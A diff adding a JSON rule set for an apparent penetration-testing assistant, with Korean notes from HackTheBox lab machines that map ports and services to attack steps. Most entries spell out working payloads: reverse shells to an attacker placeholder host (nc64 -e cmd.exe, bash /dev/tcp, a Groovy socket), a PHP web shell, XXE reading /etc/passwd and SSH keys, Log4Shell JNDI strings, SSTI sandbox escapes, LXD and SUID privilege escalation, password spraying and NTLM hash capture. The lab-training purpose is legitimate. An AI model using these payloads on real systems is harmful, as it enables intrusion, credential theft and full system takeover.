@@ -1,0 +1,264 @@
+[
+  {
+    "name": "MSSQL 자격 로그인 + xp_cmdshell RCE",
+    "when": {"ports": [1433], "services": ["ms-sql", "mssql"], "os": ["windows", "windows_ad"]},
+    "suggest": [
+      "nmap -p1433 -sV --script ms-sql-info,ms-sql-ntlm-info {t}"
+    ],
+    "note": "HTB Archetype: 확보한 자격으로 impacket mssqlclient.py <DOM>/<user>@{t} -windows-auth → SQL쉘. is_srvrolemember('sysadmin')=1 이면 EXEC sp_configure 'show advanced options',1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; → EXEC xp_cmdshell 'whoami' RCE. 리버스셸: nc64.exe 업로드 후 nc64 -e cmd.exe {atk} {port}. 자격 필요(수동).",
+    "tags": ["mssql", "rce", "impacket"],
+    "phase": "access"
+  },
+  {
+    "name": "SMB 공유 설정파일 평문자격 수집",
+    "when": {"ports": [139, 445], "services": ["smb", "microsoft-ds"]},
+    "suggest": [
+      "smbclient -L //{t}/ -N",
+      "smbmap -H {t} -u guest"
+    ],
+    "note": "HTB Archetype: 익명 접근 가능한 백업/공유(backups 등)에서 설정파일(prod.dtsConfig, web.config, *.ps1, unattend.xml) 다운로드 → 평문 자격 획득. smbclient //{t}/<share> -N → get <file>. 획득 자격은 mssql/winrm/ssh 재사용.",
+    "tags": ["smb", "creds", "loot"],
+    "phase": "enum"
+  },
+  {
+    "name": "웹 디렉토리 리스팅/백업·스왑 파일",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "gobuster dir -u http://{t} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak,swp,old,zip,sql",
+      "curl -s http://{t}/login/"
+    ],
+    "note": "HTB Base: /login/ 디렉토리 리스팅에 login.php.swp(vim 스왑). 다운로드 후 'strings file.swp' 또는 'vim -r' 로 소스 복구. .bak/.old/~/.git 도 점검. 소스에서 자격/로직 취약점 확인.",
+    "tags": ["web", "source-disclosure"],
+    "phase": "enum"
+  },
+  {
+    "name": "PHP strcmp 배열 타입저글링 인증우회",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Base: PHP 소스가 strcmp($pass,$_POST['password'])==0 (== 느슨비교) 사용 시, 배열을 주면 strcmp 가 NULL 반환 → NULL==0 true → 우회. Burp 로 POST 를 username[]=x&password[]=x 로 변조. 업로드/관리 기능 접근 후 PHP 웹셸로 RCE.",
+    "tags": ["web", "auth-bypass", "php"],
+    "phase": "access"
+  },
+  {
+    "name": "파일 업로드 → PHP 웹셸 RCE",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"], "os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Base/Oopsie/Three: 업로드 기능에 PHP 웹셸 업로드. echo '<?php system($_GET[\"cmd\"]);?>' > shell.php. 업로드 경로는 gobuster 로 /uploads /_uploaded 탐색. http://{t}/<path>/shell.php?cmd=id 로 RCE → 리버스셸(bash -c 'bash -i >& /dev/tcp/{atk}/{port} 0>&1'). 확장자 필터시 .phtml/.php5/대소문자/더블확장자 우회.",
+    "tags": ["web", "upload", "rce", "php"],
+    "phase": "access"
+  },
+  {
+    "name": "XXE 외부엔티티 파일 노출",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Markup: XML 입력을 파싱하는 엔드포인트(주문/업로드)에 XXE 주입. <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><root><field>&x;</field></root>. Windows 는 file:///c:/windows/win.ini. 소스/주석의 사용자명 단서로 file:///c:/users/<user>/.ssh/id_rsa 읽기 → SSH.",
+    "tags": ["web", "xxe", "file-read"],
+    "phase": "access"
+  },
+  {
+    "name": "SSH 개인키 재사용 로그인",
+    "when": {"ports": [22], "services": ["ssh"]},
+    "suggest": [],
+    "note": "HTB Markup: 파일노출(XXE/LFI)로 얻은 id_rsa 저장 → chmod 400 id_rsa → ssh -i id_rsa <user>@{t}. 사용자명은 웹 소스 주석/passwd/노출문서에서 추정. user.txt 획득.",
+    "tags": ["ssh", "key-reuse"],
+    "phase": "access"
+  },
+  {
+    "name": "쓰기가능 스케줄 스크립트 권한상승(Windows)",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [],
+    "note": "HTB Markup: 비표준 폴더(C:\\Log-Management\\job.bat 등) 발견 → icacls <file> 로 BUILTIN\\Users:(F) 쓰기권한 확인 + 관리자 권한 스케줄(wevtutil/schtasks/ps 로 프로세스 확인). 스크립트를 nc64.exe -e cmd.exe {atk} {port} 로 덮어쓰고 리스너 대기 → SYSTEM/Admin 셸 → root.txt.",
+    "tags": ["windows", "privesc", "scheduled-task"],
+    "phase": "privesc"
+  },
+  {
+    "name": "LFI 로컬 파일 포함",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "curl -s 'http://{t}/index.php?page=/etc/passwd'",
+      "curl -s 'http://{t}/index.php?file=../../../../etc/passwd'"
+    ],
+    "note": "HTB Included/Responder: ?page= /?file= /?lang= 등 파라미터에 경로 주입. Linux: ../../../../etc/passwd, Windows: ../../../../windows/system32/drivers/etc/hosts. php://filter/convert.base64-encode/resource=index 로 소스추출. 로그포이즈닝/업로드파일 포함 → RCE. Windows 는 UNC(//atk/x) 로 NetNTLMv2 유출.",
+    "tags": ["web", "lfi"],
+    "phase": "access"
+  },
+  {
+    "name": "TFTP 업로드 + LFI 실행 체인",
+    "when": {"ports": [69], "services": ["tftp"], "os": ["linux"]},
+    "suggest": [
+      "nmap -sU -p69 --script tftp-enum {t}"
+    ],
+    "note": "HTB Included: TFTP(69/udp) 비인증 업로드. tftp {t} → put shell.php (또는 curl -T shell.php tftp://{t}/). passwd 에서 tftp 홈 /var/lib/tftpboot 확인 → LFI 로 curl 'http://{t}/?file=/var/lib/tftpboot/shell.php' 실행 → www-data 리버스셸.",
+    "tags": ["tftp", "lfi", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "htaccess/htpasswd 자격 → su 횡이동",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Included: 셸 획득 후 /var/www/html 의 .htpasswd(user:bcrypt 또는 평문) 확인. 평문/크랙된 비번으로 su <user> 시도(비번 재사용). user.txt.",
+    "tags": ["linux", "lateral", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "LXD/LXC 그룹 권한상승",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Included: id 로 사용자가 lxd/lxc 그룹이면 권한상승 가능. alpine 이미지 import(lxc image import ... --alias alpine) → lxc init alpine privesc -c security.privileged=true → lxc config device add privesc host-root disk source=/ path=/mnt recursive=true → lxc start/exec privesc /bin/sh → /mnt/root/root.txt. (docker 그룹도 유사)",
+    "tags": ["linux", "privesc", "lxd"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Log4Shell(CVE-2021-44228) JNDI 주입",
+    "when": {"ports": [8080, 8443, 80, 443], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Unified: 취약 Java 앱(UniFi 6.4.54 등). 입력/헤더(remember, X-Api-Version, User-Agent)에 ${jndi:ldap://{atk}/x}. 탐지: sudo tcpdump -i tun0 port 389 로 콜백 확인. 익스: rogue-jndi (java -jar RogueJndi-1.1.jar --command 'bash base64 리버스셸' --hostname {atk}) → ${jndi:ldap://{atk}:1389/o=tomcat} → nc 리스너.",
+    "tags": ["web", "log4shell", "cve-2021-44228", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "MongoDB 해시 교체 인증우회",
+    "when": {"ports": [27017, 27117], "services": ["mongodb", "mongod"]},
+    "suggest": [],
+    "note": "HTB Unified: 내부 MongoDB(ps aux|grep mongo 로 포트확인) → mongo --port <p> <db> --eval 'db.admin.find()' 로 관리자 x_shadow 해시 확인. 크랙 불가 시 mkpasswd -m sha-512 <newpw> 로 만든 해시로 db.admin.update({...},{$set:{x_shadow:'<hash>'}}) → 새 비번으로 앱 로그인. 앱 설정에서 추가 평문자격(SSH root 등) 노출 가능.",
+    "tags": ["mongodb", "auth-bypass"],
+    "phase": "privesc"
+  },
+  {
+    "name": "vhost/호스트명 리다이렉트 → /etc/hosts",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "curl -sI http://{t}/",
+      "gobuster vhost -u http://{t} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
+    ],
+    "note": "HTB Ignition/Three: curl -I 가 Location: http://<name>.htb 리다이렉트하거나 Contact 이메일 도메인 발견 시 echo '{t} <name>.htb'|sudo tee -a /etc/hosts. 이후 vhost 서브도메인 열거(gobuster vhost, 3.2+ 는 --append-domain). 발견 서브도메인도 /etc/hosts 추가.",
+    "tags": ["web", "vhost", "dns"],
+    "phase": "enum"
+  },
+  {
+    "name": "CMS/관리패널 기본·추측 자격",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Ignition: Magento/WordPress 등 CMS 식별(Wappalyzer) → 기본/흔한 자격 시도. Magento 는 안티브루트포스 → 무차별 금지, admin:qwerty123 등 7자+영숫자 추측. 성공 시 패널에서 플래그/RCE 플러그인. 자격파일 노출(Crocodile) 시 user×pass 조합 스프레이.",
+    "tags": ["web", "default-cred", "cms"],
+    "phase": "access"
+  },
+  {
+    "name": "IDOR + 쿠키 역할 조작(Broken Access Control)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Oopsie: Burp 사이트맵으로 숨은 경로(/cdn-cgi/login) 발견. Guest 로그인 후 ?id=1 등 IDOR 로 상위권한 사용자 정보(Access ID) 노출. 쿠키(role=admin; user=<id>) 변조 → 제한기능(업로드) 접근 → 웹셸 RCE.",
+    "tags": ["web", "idor", "access-control"],
+    "phase": "access"
+  },
+  {
+    "name": "소스/설정에서 하드코딩 자격",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Oopsie/Vaccine: 셸 획득 후 웹루트에서 cat * | grep -i -E 'passw|user|secret|key'. db.php/config.php 의 mysqli_connect/DB 자격, 하드코딩 로그인 비번 확인 → su/ssh 재사용. 사용자는 /etc/passwd 로 확인.",
+    "tags": ["linux", "lateral", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "SUID 바이너리 권한상승",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Oopsie: find / -perm -4000 -type f 2>/dev/null 로 SUID 탐색. 그룹전용 바이너리는 find / -group <grp>. 커스텀 SUID 가 상대경로로 cat 등 호출 시 PATH 하이재킹(export PATH=.:$PATH; 가짜 cat), 또는 입력에 ../ 로 /root/root.txt 읽기. GTFOBins 참고.",
+    "tags": ["linux", "privesc", "suid"],
+    "phase": "privesc"
+  },
+  {
+    "name": "암호보호 ZIP 크랙(zip2john)",
+    "when": {"ports": [21], "services": ["ftp"]},
+    "suggest": [],
+    "note": "HTB Vaccine: FTP/웹에서 받은 암호보호 zip → zip2john backup.zip > hashes; john --wordlist=/usr/share/wordlists/rockyou.txt hashes → john --show. 압축해제 후 소스 내 해시/자격 추가 획득.",
+    "tags": ["ftp", "crack", "zip"],
+    "phase": "enum"
+  },
+  {
+    "name": "해시 식별 + hashcat 크랙",
+    "when": {},
+    "suggest": [],
+    "note": "HTB Vaccine: 발견 해시 → hashid '<hash>' 또는 hash-identifier 로 유형 추정. md5 는 hashcat -a0 -m0 hash.txt rockyou.txt, sha1 -m100, NetNTLMv2 -m5600, bcrypt -m3200. john 대안. 크랙된 비번은 웹/서비스 재사용.",
+    "tags": ["crack", "hashcat", "hash"],
+    "phase": "access"
+  },
+  {
+    "name": "SQLi sqlmap --os-shell RCE",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Vaccine: 검색/파라미터(?search=) SQLi 의심. sqlmap -u 'http://{t}/dashboard.php?search=x' --cookie='PHPSESSID=...' --batch 로 확인 → --dump 데이터, 또는 --os-shell(스택쿼리/파일쓰기 가능 DBMS, PostgreSQL 등) 로 RCE → 리버스셸 안정화.",
+    "tags": ["web", "sqli", "sqlmap", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "SMB 관리자 빈 비번 → psexec SYSTEM",
+    "when": {"ports": [445], "services": ["smb", "microsoft-ds"], "os": ["windows", "windows_ad"]},
+    "suggest": [
+      "smbclient -L //{t}/ -U Administrator"
+    ],
+    "note": "HTB Tactics: smbclient -L //{t}/ -U Administrator 에 빈 비번(Enter) → ADMIN$/C$ 접근되면 관리자 빈 비번. Option A: smbclient //{t}/C$ -U Administrator → Users\\Administrator\\Desktop → get flag.txt. Option B: impacket psexec.py administrator@{t} (비번 Enter) → NT Authority\\System (Defender 탐지주의).",
+    "tags": ["smb", "psexec", "weak-cred"],
+    "phase": "access"
+  },
+  {
+    "name": "Jenkins Script Console RCE",
+    "when": {"ports": [8080, 8443], "services": ["http", "https"]},
+    "suggest": [
+      "curl -sI http://{t}:8080/"
+    ],
+    "note": "HTB Pennyworth: Jenkins 로그인(약한자격 root:password, admin:admin). Manage Jenkins > Script Console(/script) 에서 Groovy 임의실행. 리버스셸: String host='{atk}';int port={port};String cmd='/bin/bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);... Jenkins 가 root 면 바로 root.",
+    "tags": ["jenkins", "rce", "groovy"],
+    "phase": "access"
+  },
+  {
+    "name": "SSTI 템플릿 인젝션(Node/Python)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Bike: 입력 반사 + 서버가 Node/Python(Wappalyzer). 탐지 {{7*7}} / ${7*7} / <%= 7*7 %> / #{7*7}. 49 반환+엔진식별. Handlebars 샌드박스 탈출: {{#with \"s\" as |string|}}... process.mainModule.require('child_process').execSync('whoami')... (require 직접불가→process.mainModule 우회). Jinja2: {{config.__class__...}} 또는 {{cycler.__init__.__globals__...popen}}.",
+    "tags": ["web", "ssti", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "기본비번 패스워드 스프레이(hydra)",
+    "when": {"ports": [22], "services": ["ssh"]},
+    "suggest": [],
+    "note": "HTB Funnel: 노출문서(PDF/이메일)에서 기본비번 + 사용자목록 확보 → usernames.txt(@앞부분). hydra -L usernames.txt -p '<기본비번>' {t} ssh (한 비번을 다수 계정에 스프레이, 잠금회피). SSH 외 ftp/smb/http-post-form 도 가능.",
+    "tags": ["ssh", "password-spray", "hydra"],
+    "phase": "access"
+  },
+  {
+    "name": "SSH 포트포워딩 터널(내부 서비스 접근)",
+    "when": {"ports": [22], "services": ["ssh"]},
+    "suggest": [],
+    "note": "HTB Funnel: 셸 후 ss -tln 으로 127.0.0.1 전용 서비스(5432 PostgreSQL 등, nmap 미탐지) 발견. 로컬포워딩: ssh -L 1234:localhost:5432 <user>@{t} (-fN 백그라운드). 이후 psql -h localhost -p 1234 -U <user> 로 접근. 동적(SOCKS): ssh -D 1080 → proxychains. 원격포워딩: ssh -R.",
+    "tags": ["ssh", "tunneling", "pivot"],
+    "phase": "lateral"
+  },
+  {
+    "name": "AWS S3 버킷(awscli) 열거·업로드 RCE",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Three: s3.<domain> 서브도메인/‘{\"status\":\"running\"}’ = S3(localstack). aws configure (더미 temp 값). aws --endpoint=http://s3.<domain> s3 ls → 버킷 → s3 ls s3://<bucket> 에 index.php 등 = 웹루트. echo '<?php system($_GET[\"cmd\"]);?>'>shell.php; aws --endpoint=... s3 cp shell.php s3://<bucket> → http://<domain>/shell.php?cmd=id RCE.",
+    "tags": ["cloud", "s3", "rce", "awscli"],
+    "phase": "access"
+  },
+  {
+    "name": "LFI→SMB 강제인증 NetNTLMv2 캡처",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"], "os": ["windows", "windows_ad"]},
+    "suggest": [],
+    "note": "HTB Responder: Windows LFI 에 UNC 경로 주입 ?page=//{atk}/share → sudo responder -I tun0 가 NetNTLMv2 해시 캡처. hash.txt → john -w=rockyou hash.txt → 평문. (PHP allow_url_include off 여도 SMB 로드됨)",
+    "tags": ["web", "lfi", "responder", "ntlm"],
+    "phase": "access"
+  },
+  {
+    "name": "WinRM 셸(evil-winrm)",
+    "when": {"ports": [5985, 5986], "services": ["winrm", "http"], "os": ["windows", "windows_ad"]},
+    "suggest": [
+      "nmap -p5985,5986 -sV {t}"
+    ],
+    "note": "HTB Responder: 크랙/확보한 자격으로 evil-winrm -i {t} -u <user> -p <pass> → PowerShell 셸. 해시만 있으면 evil-winrm -i {t} -u <user> -H <NTLM>. flag 는 C:\\Users\\<user>\\Desktop. 자격 필요(수동).",
+    "tags": ["winrm", "shell", "evil-winrm"],
+    "phase": "access"
+  }
+]
